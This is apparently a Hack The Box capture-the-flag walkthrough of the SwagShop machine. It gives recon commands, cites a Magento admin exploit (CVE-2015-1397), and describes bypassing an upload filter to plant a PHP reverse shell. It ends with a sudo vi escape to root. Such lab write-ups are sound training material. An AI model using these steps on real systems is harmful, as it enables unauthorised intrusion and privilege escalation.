# [SwagShop](https://app.hackthebox.com/machines/swagshop)

```bash
nmap -p- --min-rate 10000  10.10.10.140 -Pn
```

![Alt text](img/image.png)

After knowing open ports(22,80), let's do greater nmap scan.

```bash
nmap -A -sC -sV -p22,80 10.10.10.140 -Pn 
```

![Alt text](img/image-1.png)


Directory brute-forcing.

```bash
gobuster dir -u http://10.10.10.140 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40 -x php
```

![Alt text](img/image-4.png)

I need to add 'swagshop.htb' into **'/etc/hosts'** file.


I see that it is '**Magento**' application.

![Alt text](img/image-2.png)

I also see '/index.php/admin' from Directory Brute-forcing. For this, I found exploit whose CVE id is CVE-2015-1397. I need to use [it](https://www.exploit-db.com/exploits/37977)


![Alt text](img/image-3.png)


Now, I am on the Admin Panel.


First, we need to make 'YES' for 'Template Settings'

![Alt text](img/image-5.png)


Then to bypass file upload restriction, we need to add 'GIF98 ' header into our malicious php reverse shell.

![Alt text](img/image-6.png)

Also we need to change file extension from '.php' into '.php.png'

Now, we need to add 'Category'.

![Alt text](img/image-7.png)


Now, we need to add Template.

![Alt text](img/image-8.png)



While we click 'Preview Template', our malicious php file will be exeuted.

I got reverse shell.

![Alt text](img/image-9.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-10.png)

user.txt

![Alt text](img/image-11.png)


For privilege escalation, I just typed `sudo -l` command into Terminal.

![Alt text](img/image-12.png)


I see that my user has sudo privilege for `vi` binary. Let's search privesc technique from Gtfobins.

I found exploit from [Gtfobins](https://gtfobins.github.io/gtfobins/vi/#shell)

```bash
sudo /usr/bin/vi /var/www/html/*
:sh #got root shell
```

root.txt

![Alt text](img/image-13.png)